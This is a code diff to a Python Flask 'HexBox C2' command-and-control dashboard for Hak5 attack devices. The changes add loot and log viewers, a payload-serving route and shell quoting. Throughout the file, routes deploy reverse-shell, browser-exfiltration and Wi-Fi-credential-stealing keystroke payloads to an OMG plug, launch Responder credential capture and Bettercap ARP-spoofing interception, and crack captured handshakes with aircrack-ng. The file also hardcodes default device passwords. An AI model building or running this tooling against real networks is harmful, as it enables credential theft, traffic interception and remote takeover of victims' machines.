@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 # ~/hexbox/c2/hexbox_c2.py
-# Central command for all Hak5 gear
 
-from flask import Flask, render_template_string, request, jsonify
-import subprocess, paramiko, requests, json, os, signal, threading
+from flask import Flask, render_template_string, request, jsonify, send_file
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import subprocess, paramiko, requests as _req, json, os, signal, threading, shlex, socket
 from datetime import datetime
 from pathlib import Path
 
 app = Flask(__name__)
 
 # ---------------------------------------------------------------------------
-# Config — loads from config.json one directory up; falls back to defaults
+# Config
 # ---------------------------------------------------------------------------
 
 def _load_cfg():
@@ -20,9 +20,10 @@ def _load_cfg():
             return json.load(f)
     return {}
 
-_CFG       = _load_cfg()
-_HB        = _CFG.get("hexbox", {})
-DEVICES    = _CFG.get("devices") or {
+_CFG            = _load_cfg()
+_HB             = _CFG.get("hexbox", {})
+_IF             = _CFG.get("interfaces", {})
+DEVICES         = _CFG.get("devices") or {
     "pineapple":      {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple", "api_port": 1471},
     "sharkjack":      {"ip": "172.16.24.1",  "user": "root", "pass": "hak5shark"},
     "packetsquirrel": {"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
@@ -30,28 +31,33 @@ DEVICES    = _CFG.get("devices") or {
     "omgplug":        {"ip": "192.168.1.50", "user": "root", "pass": "hak5omg"},
 }
 
-LOOT        = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
-LOGS        = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
-PORT        = _HB.get("dashboard_port", 1337)
-SCAN_TARGET = _HB.get("scan_target",   "192.168.1.0/24")
+LOOT            = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
+LOGS            = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
+PAYLOADS        = Path(__file__).parent.parent / "payloads"
+PORT            = _HB.get("dashboard_port", 1337)
+SCAN_TARGET     = _HB.get("scan_target",   "192.168.1.0/24")
+IFACE_RESPONDER = _IF.get("responder", "eth0")
+IFACE_BETTERCAP = _IF.get("bettercap", "wlan0")
 
 LOOT.mkdir(parents=True, exist_ok=True)
 LOGS.mkdir(parents=True, exist_ok=True)
 
 # ---------------------------------------------------------------------------
-# Process tracking for long-running background tasks (responder, bettercap…)
+# Process tracking for long-running background tasks
 # ---------------------------------------------------------------------------
 
 _procs:      dict[str, subprocess.Popen] = {}
 _procs_lock: threading.Lock              = threading.Lock()
 
 
-def start_proc(name: str, cmd: str) -> int:
-    """Start a named background process, replacing any previous instance."""
+def start_proc(name: str, cmd) -> int:
+    """Start a named background process. cmd can be a list or a shell string."""
     with _procs_lock:
         _stop_proc_locked(name)
-        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL, start_new_session=True)
+        use_shell = isinstance(cmd, str)
+        p = subprocess.Popen(cmd, shell=use_shell,
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                             start_new_session=True)
         _procs[name] = p
     _log(f"Started {name} pid={p.pid}")
     return p.pid
@@ -89,7 +95,7 @@ def ssh_exec(device: str, cmd: str) -> str:
 
 
 def sftp_pull(device: str, remote_dir: str, local_dir: Path) -> str:
-    """Pull all files from a remote directory via SFTP (no sshpass)."""
+    """Pull all files from a remote directory via SFTP."""
     d = DEVICES[device]
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -125,7 +131,7 @@ def _log(msg: str):
         pass
 
 # ---------------------------------------------------------------------------
-# Dashboard HTML
+# Dashboard HTML — 3-tab interface: Devices / Loot / Logs
 # ---------------------------------------------------------------------------
 
 DASH = """<!DOCTYPE html>
@@ -134,13 +140,13 @@ DASH = """<!DOCTYPE html>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:16px;margin:0}
 h1{margin:0 0 3px;font-size:1.35em}
-.ts{color:#555;font-size:.78em;margin-bottom:12px}
+.ts{color:#555;font-size:.78em}
 button{background:#111;color:#0f0;border:1px solid #0f0;padding:6px 10px;margin:2px;
        cursor:pointer;font-family:monospace;font-size:.8em;transition:background .1s}
 button:hover{background:#0f0;color:#000}
 button.kill{border-color:#c00;color:#c00}
 button.kill:hover{background:#c00;color:#fff}
-pre{background:#000;border:1px solid #0f0;padding:10px;max-height:300px;overflow:auto;
+pre{background:#000;border:1px solid #0f0;padding:10px;max-height:340px;overflow:auto;
     font-size:.8em;white-space:pre-wrap;word-break:break-all;margin:0}
 .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:10px}
 .card{border:1px solid #1a1a1a;padding:10px}
@@ -154,14 +160,34 @@ pre{background:#000;border:1px solid #0f0;padding:10px;max-height:300px;overflow
 .row label{color:#555;font-size:.8em;white-space:nowrap}
 .row input{background:#111;color:#0f0;border:1px solid #333;padding:4px 6px;
            font-family:monospace;font-size:.8em;min-width:180px;flex:1}
+.row select{background:#111;color:#0f0;border:1px solid #333;padding:4px 6px;
+            font-family:monospace;font-size:.8em}
 .bar{border:1px solid #1a1a1a;padding:8px;margin-bottom:8px}
 .bar h3{margin:0 0 6px;color:#ff0;font-size:.85em}
 #procs{font-size:.8em;color:#888}
-.sec{color:#c00;margin:8px 0 5px;font-size:.9em}
+.sec{color:#c00;margin:8px 0 3px;font-size:.9em}
+.tab-bar{display:flex;gap:4px;margin:10px 0 12px;border-bottom:1px solid #1a1a1a;padding-bottom:6px}
+.tab{background:#111;color:#555;border:1px solid #333;padding:6px 16px;
+     cursor:pointer;font-family:monospace;font-size:.85em;transition:color .1s,border-color .1s}
+.tab.active{color:#0f0;border-color:#0f0}
+.tab:hover{color:#0f0}
+.loot-file{padding:4px 6px;font-size:.78em;border-bottom:1px solid #0d0d0d;
+           display:flex;justify-content:space-between;align-items:center}
+.loot-file:hover{background:#111}
+.loot-meta{color:#444;white-space:nowrap;margin-left:12px}
 </style></head><body>
 
 <h1>&#x1F5A5; HexBox C2</h1>
 <div class="ts" id="ts">{{ts}}</div>
+
+<div class="tab-bar">
+  <button class="tab active" id="btn-devices" onclick="showTab('devices')">&#9881; Devices</button>
+  <button class="tab" id="btn-loot" onclick="showTab('loot')">&#128193; Loot</button>
+  <button class="tab" id="btn-logs" onclick="showTab('logs')">&#128203; Logs</button>
+</div>
+
+<!-- ===== DEVICES TAB ===== -->
+<div id="pane-devices">
 
 <div class="row">
   <label>Target Network:</label>
@@ -203,7 +229,7 @@ pre{background:#000;border:1px solid #0f0;padding:10px;max-height:300px;overflow
 </div>
 
 <div class="card"><h2>Pi Local</h2>
-  <button onclick="run('/pi/scan')">Nmap Scan</button><br>
+  <button onclick="run('/pi/scan')">Nmap Scan (async)</button><br>
   <button onclick="run('/pi/responder')">Start Responder</button>
   <button onclick="stopProc('responder')" class="kill">Stop</button><br>
   <button onclick="run('/pi/bettercap')">Bettercap MITM</button>
@@ -222,10 +248,52 @@ pre{background:#000;border:1px solid #0f0;padding:10px;max-height:300px;overflow
 <h2 class="sec">Output</h2>
 <pre id="out">Awaiting orders...</pre>
 
-<script>
-const out=document.getElementById('out'),ts=document.getElementById('ts');
-setInterval(()=>{ts.textContent=new Date().toLocaleString();},1000);
+</div><!-- /pane-devices -->
 
+<!-- ===== LOOT TAB ===== -->
+<div id="pane-loot" style="display:none">
+<div class="row" style="margin-top:4px">
+  <button onclick="refreshLoot()">&#x21BA; Refresh</button>
+  <span class="ts" id="loot-ts"></span>
+</div>
+<div class="bar" style="max-height:480px;overflow:auto" id="loot-list">
+  <span style="color:#555">Click Refresh to load loot inventory...</span>
+</div>
+</div><!-- /pane-loot -->
+
+<!-- ===== LOGS TAB ===== -->
+<div id="pane-logs" style="display:none">
+<div class="row" style="margin-top:4px">
+  <label>Log file:</label>
+  <select id="log-sel">
+    <option value="c2">c2.log</option>
+    <option value="responder">responder.log</option>
+    <option value="crack">crack.log</option>
+    <option value="bettercap">bettercap.log</option>
+    <option value="catcher">catcher.log</option>
+    <option value="engage">engage.log</option>
+  </select>
+  <button onclick="tailLog()">&#x21BA; Refresh</button>
+  <label><input type="checkbox" id="auto-chk"> Auto (5s)</label>
+</div>
+<pre id="log-out" style="max-height:440px">Select a log and click Refresh...</pre>
+</div><!-- /pane-logs -->
+
+<script>
+const out=document.getElementById('out'),tsEl=document.getElementById('ts');
+setInterval(()=>{tsEl.textContent=new Date().toLocaleString();},1000);
+
+// ---- Tab switching ----
+function showTab(name){
+  ['devices','loot','logs'].forEach(t=>{
+    document.getElementById('pane-'+t).style.display=t===name?'':'none';
+    document.getElementById('btn-'+t).classList.toggle('active',t===name);
+  });
+  if(name==='loot') refreshLoot();
+  if(name==='logs') tailLog();
+}
+
+// ---- Devices tab helpers ----
 async function run(path){
   out.textContent='[*] '+path+'...';
   try{
@@ -271,6 +339,45 @@ async function refreshProcs(){
   }catch(_){}
 }
 
+// ---- Loot tab ----
+async function refreshLoot(){
+  const div=document.getElementById('loot-list');
+  div.textContent='Loading...';
+  try{
+    const j=await(await fetch('/loot')).json();
+    document.getElementById('loot-ts').textContent=new Date().toLocaleTimeString();
+    if(!j.files.length){div.textContent='No loot yet.';return;}
+    const groups={};
+    j.files.forEach(f=>{
+      const dir=f.path.includes('/')?f.path.split('/')[0]:'.';
+      (groups[dir]=groups[dir]||[]).push(f);
+    });
+    div.innerHTML=Object.entries(groups).map(([dir,files])=>
+      `<div class="sec">/${dir} (${files.length} file${files.length!==1?'s':''})</div>`+
+      files.map(f=>
+        `<div class="loot-file"><span>${f.path}</span>`+
+        `<span class="loot-meta">${f.mtime} &nbsp; ${(f.size/1024).toFixed(1)} KB</span></div>`
+      ).join('')
+    ).join('');
+  }catch(e){div.textContent='[ERR] '+e;}
+}
+
+// ---- Logs tab ----
+let _arTimer=null;
+async function tailLog(){
+  const name=document.getElementById('log-sel').value;
+  const pre=document.getElementById('log-out');
+  try{
+    const j=await(await fetch('/logs/tail?name='+name+'&n=100')).json();
+    pre.textContent=j.lines.join('\n')||'(empty)';
+    pre.scrollTop=pre.scrollHeight;
+  }catch(e){pre.textContent='[ERR] '+e;}
+}
+document.getElementById('auto-chk').addEventListener('change',function(){
+  clearInterval(_arTimer);
+  if(this.checked) _arTimer=setInterval(tailLog,5000);
+});
+
 checkStatus();
 refreshProcs();
 setInterval(refreshProcs,15000);
@@ -290,9 +397,7 @@ def dash():
 
 @app.route("/status")
 def status():
-    import socket
-    result = {}
-    for dev, info in DEVICES.items():
+    def _check(dev_name, info):
         ip, up = info["ip"], False
         for port in (22, 80, info.get("api_port", 0)):
             if not port:
@@ -304,7 +409,14 @@ def status():
                 break
             except Exception:
                 pass
-        result[dev] = {"ip": ip, "up": up}
+        return dev_name, {"ip": ip, "up": up}
+
+    result = {}
+    with ThreadPoolExecutor(max_workers=len(DEVICES)) as ex:
+        futures = {ex.submit(_check, dev, info): dev for dev, info in DEVICES.items()}
+        for fut in as_completed(futures):
+            name, res = fut.result()
+            result[name] = res
     return jsonify(result)
 
 
@@ -323,6 +435,41 @@ def stop_named(name: str):
     msg = f"Stopped {name}" if killed else f"{name} was not running"
     _log(msg)
     return jsonify(output=msg)
+
+
+@app.route("/loot")
+def list_loot():
+    files = []
+    for p in sorted(LOOT.rglob("*")):
+        if p.is_file():
+            st = p.stat()
+            files.append({
+                "path":  str(p.relative_to(LOOT)),
+                "size":  st.st_size,
+                "mtime": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
+            })
+    return jsonify(files=files)
+
+
+@app.route("/logs/tail")
+def tail_log():
+    raw  = request.args.get("name", "c2")
+    n    = min(int(request.args.get("n", 50)), 500)
+    safe = "".join(c for c in raw if c.isalnum() or c in "_-")
+    path = LOGS / f"{safe}.log"
+    if not path.exists():
+        return jsonify(lines=[])
+    lines = path.read_text(errors="replace").splitlines()
+    return jsonify(lines=lines[-n:])
+
+
+@app.route("/serve/<name>")
+def serve_payload(name: str):
+    safe = Path(name).name
+    path = PAYLOADS / safe
+    if path.is_file():
+        return send_file(str(path))
+    return "Not found", 404
 
 # ---------------------------------------------------------------------------
 # Pineapple
@@ -428,16 +575,16 @@ def t_met():
     return jsonify(output=out)
 
 # ---------------------------------------------------------------------------
-# OMG Plug
+# OMG Plug — paths are repo-relative, not home-relative
 # ---------------------------------------------------------------------------
 
-def _omg_deploy(payload_file: str) -> str:
-    path = Path(payload_file)
+def _omg_deploy(payload_name: str) -> str:
+    path = PAYLOADS / payload_name
     if not path.exists():
-        return f"[ERR] Payload not found: {payload_file}"
+        return f"[ERR] Payload not found: {path}"
     url = f"http://{DEVICES['omgplug']['ip']}/api/payload"
     try:
-        r = requests.post(url, json={"payload": path.read_text()}, timeout=10)
+        r = _req.post(url, json={"payload": path.read_text()}, timeout=10)
         return r.text or "Deployed"
     except Exception as e:
         return f"[ERR] {e}"
@@ -445,21 +592,21 @@ def _omg_deploy(payload_file: str) -> str:
 
 @app.route("/omg/payload/reverse", methods=["POST"])
 def omg_rev():
-    out = _omg_deploy(os.path.expanduser("~/hexbox/payloads/reverse_shell.ducky"))
+    out = _omg_deploy("reverse_shell.ducky")
     _log("OMG reverse shell deployed")
     return jsonify(output=out)
 
 
 @app.route("/omg/payload/exfil", methods=["POST"])
 def omg_exfil():
-    out = _omg_deploy(os.path.expanduser("~/hexbox/payloads/browser_exfil.ducky"))
+    out = _omg_deploy("browser_exfil.ducky")
     _log("OMG exfil deployed")
     return jsonify(output=out)
 
 
 @app.route("/omg/payload/wifi", methods=["POST"])
 def omg_wifi():
-    out = _omg_deploy(os.path.expanduser("~/hexbox/payloads/wifi_steal.ducky"))
+    out = _omg_deploy("wifi_steal.ducky")
     _log("OMG wifi steal deployed")
     return jsonify(output=out)
 
@@ -469,36 +616,41 @@ def omg_wifi():
 
 @app.route("/pi/scan", methods=["POST"])
 def pi_scan():
-    data   = request.get_json(silent=True) or {}
-    target = data.get("target", SCAN_TARGET)
-    result = subprocess.run(["nmap", "-sS", "-T4", target],
-                            capture_output=True, text=True, timeout=300)
-    out    = result.stdout + result.stderr
-    _log(f"Pi nmap → {target}")
-    return jsonify(output=out)
+    data    = request.get_json(silent=True) or {}
+    target  = data.get("target", SCAN_TARGET)
+    out_dir = LOOT / "nmap"
+    out_dir.mkdir(parents=True, exist_ok=True)
+    out_file = str(out_dir / f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+    pid = start_proc("scan", ["nmap", "-sS", "-T4", target, "-oN", out_file])
+    _log(f"Pi nmap → {target} (pid={pid})")
+    return jsonify(output=f"Scan started (pid={pid}) — results → loot/nmap/")
 
 
 @app.route("/pi/responder", methods=["POST"])
 def pi_resp():
+    iface   = shlex.quote(IFACE_RESPONDER)
+    log_arg = shlex.quote(str(LOGS / "responder.log"))
     pid = start_proc("responder",
-                     f"responder -I eth0 -wrf >> {LOGS}/responder.log 2>&1")
-    return jsonify(output=f"Responder started (pid={pid}) — logs/responder.log")
+                     f"responder -I {iface} -wrf >> {log_arg} 2>&1")
+    return jsonify(output=f"Responder started (pid={pid}) on {IFACE_RESPONDER}")
 
 
 @app.route("/pi/bettercap", methods=["POST"])
 def pi_bc():
-    pid = start_proc("bettercap",
-                     "bettercap -iface wlan0 -eval "
-                     "'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'")
-    return jsonify(output=f"Bettercap MITM started (pid={pid})")
+    pid = start_proc("bettercap", [
+        "bettercap", "-iface", IFACE_BETTERCAP, "-eval",
+        "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on",
+    ])
+    return jsonify(output=f"Bettercap MITM started (pid={pid}) on {IFACE_BETTERCAP}")
 
 
 @app.route("/pi/handshake_crack", methods=["POST"])
 def pi_crack():
+    loot_q = shlex.quote(str(LOOT / "handshakes"))
+    log_q  = shlex.quote(str(LOGS / "crack.log"))
     pid = start_proc("crack",
-                     f"for h in {LOOT}/handshakes/*.cap; do "
-                     f"aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$h\" "
-                     f">> {LOGS}/crack.log; done")
+        f'for h in {loot_q}/*.cap; do '
+        f'aircrack-ng -w /usr/share/wordlists/rockyou.txt "$h" >> {log_q}; done')
     return jsonify(output=f"Cracking started (pid={pid}) — logs/crack.log")
 
 
